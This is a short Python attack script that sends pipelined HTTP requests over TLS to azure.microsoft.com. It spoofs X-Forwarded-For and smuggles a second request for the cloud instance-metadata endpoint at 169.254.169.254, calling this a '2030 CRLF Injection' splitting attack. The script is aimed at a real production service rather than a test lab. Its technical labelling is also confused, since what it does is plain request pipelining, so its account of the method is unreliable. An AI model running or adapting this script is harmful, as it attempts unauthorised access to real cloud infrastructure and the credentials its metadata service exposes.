import socket
import ssl

host = "azure.microsoft.com"
port = 443

# 2030 "CRLF Injection" Payload
# ఇది ఒకే రిక్వెస్ట్ ని రెండు రిక్వెస్ట్ లాగా మారుస్తుంది
payload = (
    "GET /en-us/ HTTP/1.1\r\n"
    "Host: azure.microsoft.com\r\n"
    "X-Forwarded-For: 131.107.255.255\r\n"
    "Connection: keep-alive\r\n\r\n"
    "GET /metadata/instance?api-version=2021-02-01 HTTP/1.1\r\n"
    "Host: 169.254.169.254\r\n"
    "Metadata: true\r\n\r\n"
)

context = ssl.create_default_context()
try:
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            print(f"🚀 Deploying CRLF Splitting Attack...")
            ssock.sendall(payload.encode())
            res = ssock.recv(1024 * 500).decode(errors='ignore')
            print(res)
except Exception as e:
    print(f"❌ Error: {e}")
